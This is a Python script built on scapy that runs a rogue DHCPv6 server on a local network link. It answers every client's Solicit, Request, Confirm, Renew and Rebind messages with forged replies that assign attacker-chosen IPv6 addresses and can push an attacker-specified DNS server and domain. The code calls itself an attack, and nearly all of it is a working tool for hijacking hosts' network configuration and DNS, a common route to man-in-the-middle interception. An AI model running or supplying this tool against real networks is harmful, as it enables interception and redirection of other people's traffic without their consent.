#!/usr/bin/python3
import argparse
import logging
import sys
import uuid

import netifaces
from netaddr import IPNetwork
from scapy.arch import get_if_hwaddr
from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6_Advertise, DHCP6OptClientId, DHCP6OptServerId, DUID_LLT, \
    DHCP6OptDNSServers, DHCP6OptIA_NA, DHCP6OptIAAddress, DHCP6_Request, DHCP6_Reply, DHCP6OptDNSDomains, DHCP6_Confirm, \
    DHCP6_Renew, DHCP6_Rebind, DUID_LL, DUID_UUID
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sendp
from scapy.volatile import RandShort
from validate_parameters import is_valid_ipv6, random_ipv6_addr, is_valid_num, mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="Being a fake DHCPv6 server to provide every host falsified IPv6 "
                                                 "address and information about DNS server.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-prefix", dest="prefix_info", action="store", help="the network that server provides to hosts.")
    parser.add_argument("-type_add", dest="type_add", action="store", choices=['random', 'MAC'], default='random',
                        help="define how the address is generated (random or using MAC address)")
    parser.add_argument("-vlt", dest="valid_lftime", action="store", type=int, default=16000,
                        help="the valid lifetime of prefix")
    parser.add_argument("-plt", dest="prefered_lftime", action="store", type=int, default=16000,
                        help="the preferred lifetime of prefix")
    parser.add_argument("-duid", dest="duid", action="store", choices=['LL', 'LLT', 'UUID'], default='LLT',
                        help="the type of Server Identifier (DUID-LLT, DUID-LL or DUID-UUID)")
    parser.add_argument("-dns_ip", dest="dns", action="store", help="the IPv6 address of DNS server")
    parser.add_argument("-domain", dest="dns_domain", action="store", help="the DNS domain")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the prefix information
    if args.prefix_info is not None:
        if not is_valid_ipv6(args.prefix_info) and not is_valid_ipv6(str(IPNetwork(args.prefix_info).network)):
            print("---> The given prefix information is invalid. Try again!!!")
            sys.exit(1)
        if is_valid_ipv6(str(IPNetwork(args.prefix_info).network)):
            prefix_len = IPNetwork(args.prefix_info).prefixlen
            network = str(IPNetwork(args.prefix_info).network)
    if args.prefix_info is None:
        print("---> Network information of server is required. Try again!!!")
        sys.exit(1)

    # Validate the valid lifetime of prefix
    if args.valid_lftime is not None:
        if not is_valid_num(args.valid_lftime):
            print("---> The given valid lifetime of prefix is invalid. Try again!!!")
            sys.exit(1)

    # Validate the prefered lifetime of prefix
    if args.prefered_lftime is not None:
        if not is_valid_num(args.prefered_lftime):
            print("---> The given preferred lifetime of prefix is invalid. Try again!!!")
            sys.exit(1)

    # Validate the DNS IP
    if args.dns is not None:
        if not is_valid_ipv6(args.dns):
            print("---> The given IPv6 address of DNS server is invalid. Try again!!!")
            sys.exit(1)
    if args.dns is None:
        args.dns = None

    # Validate the dns domain
    if args.dns_domain is None:
        args.dns_domain = None
    if args.dns_domain is not None:
        args.dns_domain = args.dns_domain + "."

    # Get the IPv6 source and MAC
    length = len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6])
    source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][length-1]['addr']
    source_ip = source_ip.replace("%", '')
    source_ip = source_ip.replace(args.interface, '')
    source_mac = get_if_hwaddr(args.interface)

    return args.interface, source_ip, source_mac, args.prefix_info, args.type_add, args.prefered_lftime, args.valid_lftime, args.duid, args.dns, args.dns_domain


def sniff_DHCP(interface, source_ip, source_mac, prefix_info, type_add, prefered_lftime, valid_lftime, duid, dns_ip, dns_domain):

    def custom_action(packet):
        # Generate parameter
        layer2 = Ether(src=source_mac, dst=packet[0].src)
        layer3 = IPv6(src=source_ip, dst=packet[0][1].src)
        layer4 = UDP(sport=RandShort(), dport=546)
        if type_add == "random":
            offer_addr = random_ipv6_addr(prefix_info)
        if type_add == "MAC":
            prefix_len = IPNetwork(prefix_info).prefixlen
            network = str(IPNetwork(prefix_info).network)
            eui64 = mac2ipv6(packet[0].src).split("::")[-1]
            if len(network) < 17:
                offer_addr = network + eui64
            if len(network) >= 17:
                network = network[:-1]
                offer_addr = network + eui64

        if DHCP6_Solicit in packet:
            dhcp_Advertise = DHCP6_Advertise(trid=packet[0][DHCP6_Solicit].trid)
            client_ID = DHCP6OptClientId(duid=packet[0][DHCP6OptClientId][1])
            if duid == "LLT":
                server_ID = DHCP6OptServerId(duid=DUID_LLT(lladdr=source_mac))
            if duid == "LL":
                server_ID = DHCP6OptServerId(duid=DUID_LL(lladdr=source_mac))
            if duid == "UUID":
                server_ID = DHCP6OptServerId(duid=DUID_UUID(uuid=uuid.uuid1()))
            ia_na = DHCP6OptIA_NA(iaid=packet[0][DHCP6OptIA_NA].iaid, T1=43200, T2=69120, ianaopts=[DHCP6OptIAAddress(addr=offer_addr, preflft=prefered_lftime, validlft=valid_lftime)])
            packet1 = layer2 / layer3 / layer4 / dhcp_Advertise / client_ID / server_ID / ia_na
            if dns_ip is not None:
                dns_server = DHCP6OptDNSServers(dnsservers=[dns_ip])
                packet1 /= dns_server
            if dns_domain is not None:
                domain = DHCP6OptDNSDomains(dnsdomains=[dns_domain])
                packet1 /= domain
            sendp(packet1, verbose=False, iface=interface)
            return f"Receiving Solicit message from host {packet[0][1].src}\n"\
                   f"Sending Advertise message to host {packet[0][1].src} with offer: {offer_addr}"

        if DHCP6_Request in packet:
            dhcp_reply = DHCP6_Reply(trid=packet[0][DHCP6_Request].trid)
            client_id = DHCP6OptClientId(duid=packet[0][DHCP6OptClientId][1])
            if duid == "LLT":
                server_ID = DHCP6OptServerId(duid=DUID_LLT(lladdr=source_mac))
            if duid == "LL":
                server_ID = DHCP6OptServerId(duid=DUID_LL(lladdr=source_mac))
            if duid == "UUID":
                server_ID = DHCP6OptServerId(duid=DUID_UUID(uuid=uuid.uuid1()))
            ia_na = DHCP6OptIA_NA(iaid=packet[0][DHCP6OptIA_NA].iaid, T1=packet[0][DHCP6OptIA_NA].T1, T2=packet[0][DHCP6OptIA_NA].T2, ianaopts=packet[0][DHCP6OptIA_NA].ianaopts)
            packet1 = layer2 / layer3 / layer4 / dhcp_reply / client_id / server_ID / ia_na
            if dns_ip is not None:
                dns_server = DHCP6OptDNSServers(dnsservers=[dns_ip])
                packet1 /= dns_server
            if dns_domain is not None:
                domain = DHCP6OptDNSDomains(dnsdomains=[dns_domain])
                packet1 /= domain
            sendp(packet1, verbose=False, iface=interface)
            return f"Receiving Request message from host {packet[0][1].src}\n" \
                   f"Sending Reply message to host {packet[0][1].src} with confirmed address: {packet1[0][DHCP6OptIAAddress].addr}"

        if DHCP6_Confirm in packet:
            dhcp_reply = DHCP6_Reply(trid=packet[0][DHCP6_Confirm].trid)
            client_id = DHCP6OptClientId(duid=packet[0][DHCP6OptClientId][1])
            if duid == "LLT":
                server_ID = DHCP6OptServerId(duid=DUID_LLT(lladdr=source_mac))
            if duid == "LL":
                server_ID = DHCP6OptServerId(duid=DUID_LL(lladdr=source_mac))
            if duid == "UUID":
                server_ID = DHCP6OptServerId(duid=DUID_UUID(uuid=uuid.uuid1()))
            ia_na = DHCP6OptIA_NA(iaid=packet[0][DHCP6OptIA_NA].iaid, T1=32512, T2=65024, ianaopts=packet[0][DHCP6OptIA_NA].ianaopts)
            packet1 = layer2 / layer3 / layer4 / dhcp_reply / client_id / server_ID / ia_na
            if dns_ip is not None:
                dns_server = DHCP6OptDNSServers(dnsservers=[dns_ip])
                packet1 /= dns_server
            if dns_domain is not None:
                domain = DHCP6OptDNSDomains(dnsdomains=[dns_domain])
                packet1 /= domain
            sendp(packet1, verbose=False, iface=interface)
            return f"Receiving Confirm message from host {packet[0][1].src}\n" \
                   f"Sending Reply message to host {packet[0][1].src} with confirmed address: {packet1[0][DHCP6OptIAAddress].addr}"

        if DHCP6_Renew in packet:
            dhcp_reply = DHCP6_Reply(trid=packet[0][DHCP6_Renew].trid)
            client_id = DHCP6OptClientId(duid=packet[0][DHCP6OptClientId][1])
            if duid == "LLT":
                server_ID = DHCP6OptServerId(duid=DUID_LLT(lladdr=source_mac))
            if duid == "LL":
                server_ID = DHCP6OptServerId(duid=DUID_LL(lladdr=source_mac))
            if duid == "UUID":
                server_ID = DHCP6OptServerId(duid=DUID_UUID(uuid=uuid.uuid1()))
            ia_na = DHCP6OptIA_NA(iaid=packet[0][DHCP6OptIA_NA].iaid, T1=32512, T2=65024, ianaopts=packet[0][DHCP6OptIA_NA].ianaopts)
            packet1 = layer2 / layer3 / layer4 / dhcp_reply / client_id / server_ID / ia_na
            if dns_ip is not None:
                dns_server = DHCP6OptDNSServers(dnsservers=[dns_ip])
                packet1 /= dns_server
            if dns_domain is not None:
                domain = DHCP6OptDNSDomains(dnsdomains=[dns_domain])
                packet1 /= domain
            sendp(packet1, verbose=False, iface=interface)
            return f"Receiving Renew message from host {packet[0][1].src}\n" \
                   f"Sending Reply message to host {packet[0][1].src} with confirmed address: {offer_addr}"

        if DHCP6_Rebind in packet:
            dhcp_reply = DHCP6_Reply(trid=packet[0][DHCP6_Rebind].trid)
            client_id = DHCP6OptClientId(duid=packet[0][DHCP6OptClientId][1])
            if duid == "LLT":
                server_ID = DHCP6OptServerId(duid=DUID_LLT(lladdr=source_mac))
            if duid == "LL":
                server_ID = DHCP6OptServerId(duid=DUID_LL(lladdr=source_mac))
            if duid == "UUID":
                server_ID = DHCP6OptServerId(duid=DUID_UUID(uuid=uuid.uuid1()))
            ia_na = DHCP6OptIA_NA(iaid=packet[0][DHCP6OptIA_NA].iaid, T1=32512, T2=65024, ianaopts=packet[0][DHCP6OptIA_NA].ianaopts)
            packet1 = layer2 / layer3 / layer4 / dhcp_reply / client_id / server_ID / ia_na
            if dns_ip is not None:
                dns_server = DHCP6OptDNSServers(dnsservers=[dns_ip])
                packet1 /= dns_server
            if dns_domain is not None:
                domain = DHCP6OptDNSDomains(dnsdomains=[dns_domain])
                packet1 /= domain
            sendp(packet1, verbose=False, iface=interface)
            return f"Receiving Rebind message from host {packet[0][1].src}\n" \
                   f"Sending Reply message to host {packet[0][1].src} with confirmed address: {packet1[0][DHCP6OptIAAddress].addr}"

    # Setup sniff, filtering for IP traffic to see the result
    print("Initializing DHCPv6 Server attack on the link (press Ctrl+C to stop the attack).....")
    build_filter = "udp and (port 546 or 547)"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    interface, source_ip, source_mac, prefix_info, type_add, prefered_lftime, valid_lftime, duid, dns, dns_domain = main()
    sniff_DHCP(interface, source_ip, source_mac, prefix_info, type_add, prefered_lftime, valid_lftime, duid, dns, dns_domain)
